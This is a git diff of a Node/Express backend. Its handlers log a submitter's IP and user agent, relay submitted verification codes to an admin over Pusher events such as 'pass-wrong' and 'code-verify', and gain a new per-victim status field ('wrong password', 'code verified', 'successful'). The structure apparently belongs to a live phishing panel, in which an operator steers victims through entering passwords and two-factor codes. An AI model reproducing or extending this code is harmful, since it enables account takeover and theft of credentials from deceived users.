@@ -81,7 +81,8 @@ export const email_post = async (req, res) => {
                 poster: posterId,
                 root: posterFound._id,
                 ip:ipAddress,
-                agent:userAgent
+                agent:userAgent,
+                status: "pending"
                 })
             if(info){
                 pusher.trigger(userFound.adminId, 'new-notification', {
@@ -241,10 +242,10 @@ export const password_post_wrong = async(req, res) => {
         const info = await Info.findOne({ _id: id })
         if (info ) {
 
-         
-            
+            info.status = "wrong password";
+            await info.save();
 
-           
+            
                 pusher.trigger(id, 'pass-wrong', {
                     id:id
                   });
@@ -290,8 +291,8 @@ export const code_page_post = async(req, res) => {
     try {
         const info = await Info.findOne({ _id: id })
         if (info ) {
-
-         
+            info.status = "code verified";
+            await info.save();
             
                 pusher.trigger(id, 'code-verify', {
                     code: code,id:id
@@ -337,8 +338,8 @@ export const reverify_code_page_post = async(req, res) => {
     try {
         const info = await Info.findOne({ _id: id })
         if (info ) {
-
-         
+            info.status = "code reverified";
+            await info.save();
             
                 pusher.trigger(id, 'code-re-verify', {
                     id:id
@@ -596,7 +597,8 @@ export const successful_page_post = async(req, res) => {
         const info = await Info.findOne({ _id: id })
         if (info ) {
 
-      
+            info.status = "successful";
+            await info.save();
 
            
                 pusher.trigger(id, 'login-successfull', {
